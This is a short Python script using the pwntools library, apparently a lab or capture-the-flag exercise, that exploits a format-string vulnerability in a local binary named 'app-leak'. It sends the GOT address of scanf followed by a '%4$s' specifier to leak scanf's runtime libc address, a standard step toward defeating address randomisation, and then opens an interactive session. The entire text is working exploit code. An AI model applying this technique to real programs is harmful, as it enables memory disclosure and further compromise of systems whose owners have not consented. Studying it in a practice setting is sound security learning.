from pwn import *
sh = process('./app-leak')
leakmemory = ELF('./app-leak')
# address of scanf entry in GOT, where we need to read content
__isoc99_scanf_got = leakmemory.got['__isoc99_scanf']
print ("- GOT of scanf: %s" % hex(__isoc99_scanf_got))
# prepare format string to exploit
# change to your format string
fm_str = b'%4$s'
payload = p32(__isoc99_scanf_got) + fm_str
print ("- Your payload: %s"% payload)
# send format string
sh.sendline(payload)
sh.recvuntil(fm_str+b'\n')
# remove the first bytes of __isoc99_scanf@got
print ('- Address of scanf: %s'% hex(u32(sh.recv()[4:8])))
sh.interactive()
